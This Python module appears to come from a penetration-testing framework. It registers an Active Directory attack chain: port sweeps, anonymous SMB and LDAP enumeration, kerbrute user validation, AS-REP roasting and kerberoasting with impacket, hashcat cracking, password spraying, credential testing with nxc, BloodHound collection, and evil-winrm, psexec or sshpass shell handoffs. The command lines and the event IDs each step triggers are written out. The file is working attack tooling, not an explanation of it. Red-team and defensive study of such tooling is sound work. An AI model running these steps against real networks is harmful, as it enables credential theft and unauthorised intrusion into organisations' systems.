"""
The built-in action catalogue — the single place capabilities are registered.

Each handler is a thin adapter that calls an existing p0rtix function and lets it
push facts through `ctx.facts` (a FactStore passed as `runner.ws`, so the legacy
handler bodies emit unlock events with zero changes). Adding a new tool to the
engine is one `register(...)` call here.

Phase 1 registers the passive actions + the first green vertical slice
(discovery, on-demand version detect, anonymous SMB, anonymous LDAP). Yellow/red
and the session/shell/CVE actions land in later phases.
"""
from __future__ import annotations

import re
from pathlib import Path

from lib import nmap
from lib.engine.action import Action, ActionResult, Footprint, Requirement, Tier
from lib.engine.facts import FactStore, ProtoStatus
from lib.engine.registry import ActionRegistry
from lib.models import Service

_LDAP_PORTS = (389, 636, 3268, 3269)


# ── passive (run at console open; zero packets) ───────────────────────────────
def _h_parse_prior(ctx) -> ActionResult:
    """Load any Service objects from a prior scan's saved nmap XML into facts."""
    found = 0
    for label, proto in (("*_tcp_services.xml", "tcp"), ("*_udp_confirmed.xml", "udp")):
        xml = next(ctx.runner.ws.raw_dir.glob(label), None)
        if xml:
            services = nmap.parse_service_xml(xml, proto)
            if services:
                ctx.facts.set_services(services)
                found += len(services)
    return ActionResult(ok=True, summary=f"loaded {found} service(s) from prior scan")


# ── green: discovery ──────────────────────────────────────────────────────────
def _h_tcp_quick(ctx) -> ActionResult:
    ports = nmap.discover_tcp_quick(ctx.ip, ctx.runner, ctx.runner.ws)
    ctx.facts.add_scanned_tcp(nmap.QUICK_TCP_PORTS)     # remember coverage
    for p in ports:
        ctx.facts.add_open_port("tcp", p)
    ctx.findings.bullet(f"Open TCP ports (quick): {', '.join(map(str, ports)) or 'none'}")
    return ActionResult(ok=True, summary=f"{len(ports)} open TCP port(s) [quick]")


def _h_tcp_common(ctx) -> ActionResult:
    ports = nmap.discover_tcp_common(ctx.ip, ctx.runner, ctx.runner.ws)
    ctx.facts.add_scanned_tcp(nmap.COMMON_TCP_PORTS)
    for p in ports:
        ctx.facts.add_open_port("tcp", p)
    ctx.findings.bullet(f"Open TCP ports (common): {', '.join(map(str, ports)) or 'none'}")
    return ActionResult(ok=True, summary=f"{len(ports)} open TCP port(s) [common]")


def _h_tcp_ports(ctx) -> ActionResult:
    # Skip ports an earlier tier already swept — coverage is remembered.
    exclude = ctx.facts.scanned_tcp()
    ports = nmap.discover_tcp_open(ctx.ip, ctx.runner, ctx.runner.ws, exclude=exclude)
    ctx.facts.add_scanned_tcp(range(1, 65536))
    for p in ports:
        ctx.facts.add_open_port("tcp", p)
    extra = f" (excluded {len(exclude)} already-swept)" if exclude else ""
    ctx.findings.bullet(f"Open TCP ports (full{extra}): {', '.join(map(str, ports)) or 'none'}")
    return ActionResult(ok=True, summary=f"{len(ports)} open TCP port(s) [full]")


def _h_udp_ports(ctx) -> ActionResult:
    ports = nmap.discover_udp(ctx.ip, ctx.runner, ctx.runner.ws)
    for p in ports:
        ctx.facts.add_open_port("udp", p)
    ctx.findings.bullet(f"Open UDP ports: {', '.join(map(str, ports)) or 'none'}")
    return ActionResult(ok=True, summary=f"{len(ports)} open UDP port(s)")


def _dedup_tcp(ports: set[int]) -> set[int]:
    """Collapse sibling ports that share a service so we don't spawn a useless
    second section: 445 supersedes 139; plaintext LDAP 389 supersedes its
    LDAPS/GC siblings (3268/636/3269); else 636 supersedes GC-LDAPS 3269."""
    drop: set[int] = set()
    if 445 in ports and 139 in ports:
        drop.add(139)
    if 389 in ports:
        drop |= {p for p in (3268, 636, 3269) if p in ports}
    elif 636 in ports and 3269 in ports:
        drop.add(3269)
    return ports - drop


def _open_tcp_ports(facts: FactStore) -> list[dict]:
    tcp = {p for (proto, p) in facts.snapshot()["open_ports"] if proto == "tcp"}
    return [{"port": p} for p in sorted(_dedup_tcp(tcp))]


def _h_version_detect(ctx) -> ActionResult:
    port = ctx.target_port
    services = nmap.version_detect(ctx.ip, [port], ctx.runner, ctx.runner.ws)
    ctx.facts.add_services(services)
    for s in services:
        ctx.findings.bullet(f"{s.proto}/{s.port}: {s.name} {s.version}".rstrip())
    return ActionResult(ok=True, summary=f"version-detected {port}")


# ── green: anonymous SMB / LDAP (wrap existing handler bodies) ─────────────────
def _h_smb_users(ctx) -> ActionResult:
    from lib import services
    services._smb_users(ctx.ip, 445, ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="SMB users (RID cycle + --users)")


def _h_smb_shares(ctx) -> ActionResult:
    from lib import services
    services._smb_shares(ctx.ip, 445, ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="SMB share access")


def _h_smb_spider(ctx) -> ActionResult:
    from lib import services
    services._smb_spider_shares(ctx.ip, 445, ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="SMB share spidering")


def _h_smb_policy(ctx) -> ActionResult:
    from lib import services
    services._smb_policy(ctx.ip, 445, ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="SMB password/lockout policy")


def _ldap_port(facts: FactStore) -> int | None:
    for p in _LDAP_PORTS:
        if facts.has(f"tcp/{p}"):
            return p
    return None


def _ldap_svc(ctx) -> Service:
    port = _ldap_port(ctx.facts) or 389
    return Service(port=port, proto="tcp", name="ldap", version="",
                   is_web=False, scheme="", hostname=ctx.domain or "")


def _h_ldap_domain_info(ctx) -> ActionResult:
    from lib import services
    services._ldap_domain_info(ctx.ip, _ldap_svc(ctx), ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="LDAP domain info (base DN, policy, computers)")


def _h_ldap_users(ctx) -> ActionResult:
    from lib import services
    services._ldap_users(ctx.ip, _ldap_svc(ctx), ctx.runner, ctx.findings, ctx.available)
    # If anonymous bind yielded nothing, mark the branch dormant until a cred.
    if not ctx.facts.has("users") and not ctx.facts.has("domain"):
        ctx.facts.set_proto_status("ldap", ProtoStatus.ANON_DENIED)
    return ActionResult(ok=True, summary="LDAP users + AS-REP-roastable")


def _h_ldap_groups(ctx) -> ActionResult:
    from lib import services
    services._ldap_groups(ctx.ip, _ldap_svc(ctx), ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="LDAP groups + privileged accounts")


def _h_ldap_delegation(ctx) -> ActionResult:
    from lib import services
    services._ldap_delegation(ctx.ip, _ldap_svc(ctx), ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="LDAP delegation surface")


# ── yellow: AS-REP roast (unlocked by domain + a user list) ───────────────────
def _ensure_users_file(facts: FactStore) -> Path:
    """Return loot/users.txt, materialising it from the fact store if add_user
    has not already written it (e.g. users seeded purely in memory)."""
    path = facts.loot_dir / "users.txt"
    if not path.exists() or path.stat().st_size == 0:
        users = facts.snapshot()["users"]
        path.write_text("\n".join(users) + ("\n" if users else ""))
    return path


def _register_hashes(facts, kind: str, lines) -> int:
    """Record each captured hash line under its principal (so the UI can show
    uncracked→crack / cracked→plaintext, keyed by account)."""
    from lib.workspace import Workspace
    n = 0
    for line in lines:
        if line.strip():
            facts.add_hash(kind, Workspace._krb_principal(line))
            n += 1
    return n


def _h_userenum(ctx) -> ActionResult:
    """Validate the user list against the KDC with kerbrute. Most useful for
    seeded/OSINT names — directory-sourced users are already confirmed."""
    domain = ctx.facts.discovered_domain or ctx.domain
    if not domain:
        return ActionResult(ok=False, summary="no domain known")
    users_file = _ensure_users_file(ctx.facts)
    cmd = ["kerbrute", "userenum", "--dc", ctx.ip, "-d", domain, str(users_file)]
    ctx.findings.cmd(" ".join(cmd))
    out = ctx.runner.run(cmd, "kerb_userenum", timeout=300)
    valid = re.findall(r"VALID USERNAME:\s+(\S+)", out)
    for u in valid:
        ctx.facts.add_user(u.split("@")[0], authoritative=True)
    if valid:
        ctx.findings.bullet(f"**kerbrute confirmed {len(valid)} user(s):** "
                            + ", ".join(sorted({u.split('@')[0] for u in valid})))
    return ActionResult(ok=True, summary=f"{len(valid)} user(s) confirmed")


def _h_asrep_roast(ctx) -> ActionResult:
    domain = ctx.facts.discovered_domain or ctx.domain
    if not domain:
        return ActionResult(ok=False, summary="no domain known")
    users_file = _ensure_users_file(ctx.facts)
    cmd = [
        "impacket-GetNPUsers", f"{domain}/", "-no-pass", "-dc-ip", ctx.ip,
        "-request", "-format", "hashcat", "-usersfile", str(users_file),
    ]
    ctx.findings.cmd(" ".join(cmd))
    out = ctx.runner.run(cmd, "kerb_asrep_GetNPUsers", timeout=180)
    lines = [l.strip() for l in out.splitlines() if "$krb5asrep$" in l]
    if lines:
        ctx.facts.append_krb_hashes("asrep.hash", lines)
        ctx.findings.bullet("**AS-REP roastable hash(es) found — crack with `hashcat -m 18200`**")
        ctx.findings.code_block("\n".join(lines))
        ctx.findings.add_summary("**AS-REP hash(es) in `loot/asrep.hash`** — crack: `hashcat -m 18200`")
        _register_hashes(ctx.facts, "asrep", lines)
        return ActionResult(ok=True, summary=f"{len(lines)} AS-REP hash(es) captured")
    ctx.facts.set_proto_status("kerberos", ProtoStatus.EXHAUSTED)
    return ActionResult(ok=True, summary="no AS-REP roastable accounts")


# ── passive: offline crack (local hashcat; zero packets to target) ────────────
def _h_crack(ctx) -> ActionResult:
    from lib import crack
    cracked = crack.crack_hashes(ctx.facts, ctx.runner, ctx.findings, ctx.available)
    # Record each cracked (user, password) as a targeted pair so creds.test can
    # verify it as itself instead of spraying it, and flip the hash to cracked.
    for user, password in cracked:
        if user:
            ctx.facts.add_cred_pair(user, password)
            ctx.facts.mark_hash_cracked(user, password)
    if cracked:
        return ActionResult(ok=True, summary=f"cracked {len(cracked)} password(s)")
    return ActionResult(ok=True, summary="no hashes cracked")


# ── yellow: credential spray (validate candidate passwords → valid_cred) ──────
def _h_creds_spray(ctx) -> ActionResult:
    import p0rtix                                   # late import (avoids cycle)
    open_tcp = [p for (proto, p) in ctx.facts.snapshot()["open_ports"] if proto == "tcp"]
    services = [Service(port=p, proto="tcp", name="", version="", is_web=False,
                        scheme="", hostname="") for p in open_tcp]
    before = len(ctx.facts.snapshot()["valid_creds"])
    p0rtix._run_cred_reuse(ctx.ip, ctx.runner, ctx.findings, ctx.facts,
                           services, ctx.available)
    gained = len(ctx.facts.snapshot()["valid_creds"]) - before
    return ActionResult(ok=True, summary=f"{gained} new valid credential(s)")


# ── yellow: authenticated AD core (unlocked by a valid credential) ────────────
def _pick_enum_cred(facts: FactStore) -> tuple[str, str] | None:
    """Choose a valid credential to enumerate with — prefer a real user account
    over a machine account ($)."""
    valids = facts.snapshot()["valid_creds"]
    for u, p in valids:
        if not u.endswith("$"):
            return (u, p)
    return valids[0] if valids else None


def _enum_cred_or_none(ctx):
    """(domain, user, pw) for authenticated enum, or None if not ready."""
    domain = ctx.facts.discovered_domain or ctx.domain
    cred = _pick_enum_cred(ctx.facts)
    if not domain or cred is None:
        return None
    return domain, cred[0], cred[1]


def _h_ldap_domaindump(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    credsmode._ad_ldapdomaindump(ctx.ip, domain, user, pw, ctx.runner,
                                 ctx.findings, ctx.facts, ctx.available)
    credsmode._ad_enrichment(ctx.ip, domain, user, pw, ctx.runner,
                             ctx.findings, ctx.facts, ctx.available)
    ctx.facts.set_proto_status("ldap", ProtoStatus.EXHAUSTED)
    return ActionResult(ok=True, summary=f"LDAP domain dump as {user}")


def _h_kerberoast(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    credsmode.sync_clock(ctx.ip, ctx.runner, ctx.findings, ctx.available)
    n = credsmode._ad_kerberoast(ctx.ip, domain, user, pw, ctx.runner,
                                 ctx.findings, ctx.facts, ctx.available)
    if n:
        kfile = ctx.facts.loot_dir / "kerberoast.hash"
        lines = kfile.read_text().splitlines() if kfile.exists() else []
        _register_hashes(ctx.facts, "kerberoast",
                         [l for l in lines if "$krb5tgs$" in l])
    return ActionResult(ok=True, summary=f"{n} kerberoastable hash(es)")


def _h_bloodhound(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    zip_path = credsmode._ad_bloodhound(ctx.ip, domain, user, pw, ctx.runner,
                                        ctx.findings, ctx.facts, ctx.available)
    return ActionResult(ok=True,
                        summary=f"bloodhound: {zip_path.name if zip_path else 'no data'}")


def _h_writable_objects(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    targets = credsmode._bloodyad_writable(ctx.ip, domain, user, pw, ctx.runner,
                                           ctx.findings, ctx.facts, ctx.available)
    return ActionResult(ok=True, summary=f"{len(targets or [])} writable object(s)")


# ── yellow: credential access test (verify pairs as-is — no spray) ────────────
def _h_creds_test(ctx) -> ActionResult:
    """Test each known credential pair (cracked pairs + confirmed valid creds)
    against the open auth services as that exact (user, pass) — verification, not
    a user-list spray. Confirmed access is recorded and a handoff command shown."""
    snap = ctx.facts.snapshot()
    pairs = sorted(set(snap["cred_pairs"]) | set(snap["valid_creds"]))
    if not pairs:
        return ActionResult(ok=False, summary="no credential pairs to test")
    if "nxc" not in ctx.available:
        return ActionResult(ok=False, summary="nxc not available")
    open_tcp = {p for proto, p in snap["open_ports"] if proto == "tcp"}
    domain = ctx.facts.discovered_domain or ctx.domain or ""
    services = [("smb", 445), ("winrm", 5985), ("ssh", 22),
                ("rdp", 3389), ("mssql", 1433)]
    confirmed = 0
    for user, pw in pairs:
        for svc, port in services:
            if port not in open_tcp:
                continue
            cmd = ["nxc", svc, ctx.ip, "-u", user, "-p", pw]
            if domain and svc != "ssh":      # ssh auth isn't domain-scoped
                cmd += ["-d", domain]
            label = re.sub(r"[^a-z0-9]", "_", f"{svc}_{user}".lower())[:24]
            out = ctx.runner.run(cmd, f"credtest_{label}", timeout=60)
            for line in out.splitlines():
                if "[+]" not in line:
                    continue
                confirmed += 1
                if "Pwn3d!" in line:
                    ctx.facts.add_admin_cred(user, pw)
                    ctx.findings.bullet(f"**ADMIN access ({svc}):** `{user}` — {line.strip()}")
                    ctx.findings.add_summary(f"**Admin {svc.upper()} as `{user}`**")
                else:
                    ctx.facts.add_valid_cred(user, pw, svc.upper())
                    ctx.findings.bullet(f"**Valid {svc} access:** `{user}` — {line.strip()}")
                if svc == "winrm":
                    ctx.findings.add_summary(
                        f"WinRM shell handoff: `evil-winrm -i {ctx.ip} -u {user} -p {pw}`")
                elif svc == "ssh":
                    ctx.findings.add_summary(
                        f"SSH shell handoff: `sshpass -p '{pw}' ssh {user}@{ctx.ip}`")
                break
    return ActionResult(ok=True,
                        summary=f"tested {len(pairs)} pair(s) — {confirmed} access hit(s)")


# ── red: opt-in interactive shell handoff (armed only) ────────────────────────
def _h_shell(ctx) -> ActionResult:
    from lib.engine import access
    cmd = access.shell_command(ctx.facts, ctx.ip)
    if cmd is None:
        return ActionResult(ok=False,
                            summary="no admin-SMB / WinRM credential for a shell")
    ctx.findings.bullet(f"**Interactive shell handoff:** `{' '.join(cmd)}`")
    ctx.findings.add_summary(f"Operator shell: `{' '.join(cmd)}`")
    access.launch_shell(cmd)        # blocks until the operator exits (tty handoff)
    return ActionResult(ok=True, summary=f"shell session via {cmd[0]}")


def _can_shell(f) -> bool:
    return (f.has("valid_cred") or f.has("admin_cred")) and \
           (f.has("tcp/5985") or f.has("tcp/445") or f.has("tcp/22"))


def build_registry() -> ActionRegistry:
    reg = ActionRegistry()

    reg.register(Action(
        "recon.parse_prior", Tier.PASSIVE, _h_parse_prior,
        group="discovery", order=0,
        footprint=Footprint(summary="reads saved nmap XML (local only)"),
        gate=lambda f: any(f.machine_dir.joinpath("raw").glob("*_services.xml")),
    ))

    reg.register(Action(
        "discovery.tcp_quick", Tier.GREEN, _h_tcp_quick,
        group="discovery", order=1,
        footprint=Footprint(
            summary="quiet curated SYN sweep — AD profile (~60 ports)",
            network="small SYN sweep — lower IDS footprint than -p-",
        ),
        deps=("nmap",),
    ))
    reg.register(Action(
        "discovery.tcp_common", Tier.GREEN, _h_tcp_common,
        group="discovery", order=2,
        footprint=Footprint(
            summary="quiet curated SYN sweep — common internal services (Linux/web/db)",
            network="small SYN sweep — lower IDS footprint than -p-",
        ),
        deps=("nmap",),
    ))
    reg.register(Action(
        "discovery.tcp_ports", Tier.GREEN, _h_tcp_ports,
        group="discovery", order=3,
        footprint=Footprint(
            summary="full TCP SYN sweep (skips ports an earlier tier already swept)",
            network="SYN sweep — firewall connection logs / IDS port-scan signature",
        ),
        deps=("nmap",),
    ))
    reg.register(Action(
        "discovery.udp_top100", Tier.GREEN, _h_udp_ports,
        group="discovery", order=4,
        footprint=Footprint(summary="top-100 UDP sweep",
                            network="UDP probes — firewall/IDS"),
        deps=("nmap",),
    ))
    reg.register(Action(
        "svc.version_detect", Tier.GREEN, _h_version_detect,
        group="discovery", order=5,
        footprint=Footprint(summary="per-port -sV banner grab",
                            network="extra connection + banner grab per port"),
        gate=lambda f: bool(_open_tcp_ports(f)),
        instances=_open_tcp_ports,
        requires=(Requirement("open_tcp", "an open TCP port"),),
        deps=("nmap",),
    ))

    # Anonymous SMB, decomposed into cohesive sub-actions. `run smb` runs the
    # whole branch; each is also individually runnable.
    _smb_gate = lambda f: f.has("tcp/445")          # noqa: E731
    _smb_req = (Requirement("tcp/445", "SMB (tcp/445) open"),)
    _smb_evt = Footprint(windows_events=("4624 (type 3, often below audit)",))
    reg.register(Action(
        "smb.users", Tier.GREEN, _h_smb_users, group="smb", order=1,
        footprint=Footprint(summary="anonymous SMB: RID cycle + --users (domain roster)",
                            windows_events=_smb_evt.windows_events),
        gate=_smb_gate, requires=_smb_req, deps=("nxc",),
        supersedes=("smb.enum4linux",),     # no-overlap: covers enum4linux ground
    ))
    reg.register(Action(
        "smb.shares", Tier.GREEN, _h_smb_shares, group="smb", order=2,
        footprint=Footprint(summary="anonymous / Guest share access"),
        gate=_smb_gate, requires=_smb_req, deps=("nxc",),
    ))
    reg.register(Action(
        "smb.spider", Tier.GREEN, _h_smb_spider, group="smb", order=3,
        footprint=Footprint(summary="recursively list/download files from readable shares"),
        gate=_smb_gate, requires=_smb_req, deps=("nxc",),
    ))
    reg.register(Action(
        "smb.policy", Tier.GREEN, _h_smb_policy, group="smb", order=4,
        footprint=Footprint(summary="domain password / lockout policy (safe-to-spray signal)"),
        gate=_smb_gate, requires=_smb_req, deps=("nxc",),
    ))

    # Anonymous LDAP, decomposed into cohesive sub-actions. `run ldap` runs the
    # whole branch; each is also individually runnable. All gated on an LDAP port,
    # and suppressed once the branch is ANON_DENIED (waits for a cred / recheck).
    _ldap_gate = lambda f: _ldap_port(f) is not None        # noqa: E731
    _ldap_req = (Requirement("ldap_port", "LDAP (tcp/389|636|3268|3269) open"),)
    for _name, _order, _h, _desc in (
        ("ldap.domain_info", 1, _h_ldap_domain_info,
         "anonymous LDAP: base DN, password policy, computers"),
        ("ldap.users", 2, _h_ldap_users,
         "anonymous LDAP: domain users + AS-REP-roastable accounts"),
        ("ldap.groups", 3, _h_ldap_groups,
         "anonymous LDAP: groups + privileged (adminCount) accounts"),
        ("ldap.delegation", 4, _h_ldap_delegation,
         "anonymous LDAP: unconstrained / constrained delegation"),
    ):
        reg.register(Action(
            _name, Tier.GREEN, _h, group="ldap", order=_order,
            footprint=Footprint(summary=_desc),
            gate=_ldap_gate, requires=_ldap_req, deps=("ldapsearch",),
            suppressed_by=(ProtoStatus.ANON_DENIED,),
        ))

    reg.register(Action(
        "kerberos.userenum", Tier.YELLOW, _h_userenum,
        group="kerberos", order=0,
        footprint=Footprint(
            summary="validate the user list against the KDC (kerbrute)",
            windows_events=("4768 (TGT requested)", "4771 (pre-auth failed)"),
        ),
        gate=lambda f: f.has("domain") and f.has("users"),
        requires=(Requirement("domain", "a domain"),
                  Requirement("users", "a user list")),
        deps=("kerbrute",),
    ))
    reg.register(Action(
        "kerberos.asrep_roast", Tier.YELLOW, _h_asrep_roast,
        group="kerberos", order=1,
        footprint=Footprint(
            summary="AS-REP roast: one AS-REQ (no pre-auth) per known user",
            windows_events=("4768 (TGT requested)", "4771 (pre-auth failed)"),
        ),
        gate=lambda f: f.has("domain") and f.has("users"),
        requires=(Requirement("domain", "a domain"),
                  Requirement("users", "a user list")),
        deps=("impacket-GetNPUsers",),
    ))

    reg.register(Action(
        "crack.hashes", Tier.PASSIVE, _h_crack,
        group="creds", order=1,
        footprint=Footprint(
            summary="offline hashcat + rockyou on uncracked hashes (local only)"),
        gate=lambda f: f.has("hash:uncracked"),
        requires=(Requirement("hash:uncracked", "an uncracked hash"),),
        deps=("hashcat",),
    ))

    reg.register(Action(
        "creds.test", Tier.YELLOW, _h_creds_test,
        group="creds", order=2,
        footprint=Footprint(
            summary="verify known credential pair(s) for access — not a spray",
            windows_events=("4624 (logon) on a hit", "4625 (failed logon)"),
        ),
        gate=lambda f: (f.has("cred_pair") or f.has("valid_cred")) and f.has("tcp/445"),
        requires=(Requirement("cred_pair", "a credential pair (cracked/known)"),
                  Requirement("tcp/445", "SMB (tcp/445) open")),
        deps=("nxc",),
    ))

    reg.register(Action(
        "creds.spray", Tier.YELLOW, _h_creds_spray,
        group="creds", order=3,
        footprint=Footprint(
            summary="spray candidate password(s) across the whole user list (SMB/WinRM)",
            windows_events=("4625 (failed logon)", "4624 (logon) on a hit"),
        ),
        gate=lambda f: f.has("cred") and f.has("tcp/445"),
        requires=(Requirement("cred", "a candidate password (cracked/leaked)"),
                  Requirement("tcp/445", "SMB (tcp/445) open")),
        deps=("nxc",),
    ))

    # Authenticated AD enumeration, decomposed into one-decision-per-action steps
    # (replacing the monolithic ad.authenticated_core). All gated valid_cred+domain.
    _authed = lambda f: f.has("valid_cred") and f.has("domain")  # noqa: E731
    _authed_reqs = (Requirement("valid_cred", "a valid credential"),
                    Requirement("domain", "a domain"))

    reg.register(Action(
        "ldap.domaindump", Tier.YELLOW, _h_ldap_domaindump,
        group="ldap", order=2,
        footprint=Footprint(
            summary="authenticated LDAP dump + enrichment (delegation/MAQ/policy)",
            windows_events=("4662 (directory reads)",)),
        gate=_authed, requires=_authed_reqs, deps=("ldapdomaindump",),
    ))
    reg.register(Action(
        "kerberos.kerberoast", Tier.YELLOW, _h_kerberoast,
        group="kerberos", order=2,
        footprint=Footprint(
            summary="request TGS for SPN accounts → crackable hashes",
            windows_events=("4769 (TGS requested)",)),
        gate=_authed, requires=_authed_reqs, deps=("impacket-GetUserSPNs",),
    ))
    reg.register(Action(
        "bloodhound.collect", Tier.YELLOW, _h_bloodhound,
        group="ad", order=1,
        footprint=Footprint(
            summary="BloodHound collection (All, DCOnly fallback) → attack paths",
            windows_events=("4662 (directory reads)",)),
        gate=_authed, requires=_authed_reqs, deps=("bloodhound-python",),
    ))
    reg.register(Action(
        "ad.writable_objects", Tier.YELLOW, _h_writable_objects,
        group="ad", order=2,
        footprint=Footprint(
            summary="enumerate writable users/groups/computers (privesc targets)"),
        gate=_authed, requires=_authed_reqs, deps=("bloodyAD",),
    ))

    reg.register(Action(
        "access.shell", Tier.YELLOW, _h_shell,
        group="access", order=1,
        manual_only=True,          # only ever via an explicit `run access.shell`
        footprint=Footprint(
            summary="hand the terminal off to an interactive evil-winrm/psexec/"
                    "ssh session (operator-driven; not C2)",
            windows_events=("4624/4672 (interactive/admin logon)",
                            "7045 (psexec service install)")),
        gate=_can_shell,
        requires=(Requirement("valid_cred", "a valid credential"),
                  Requirement("tcp/5985", "WinRM (5985) / admin SMB (445) / SSH (22)")),
    ))

    return reg
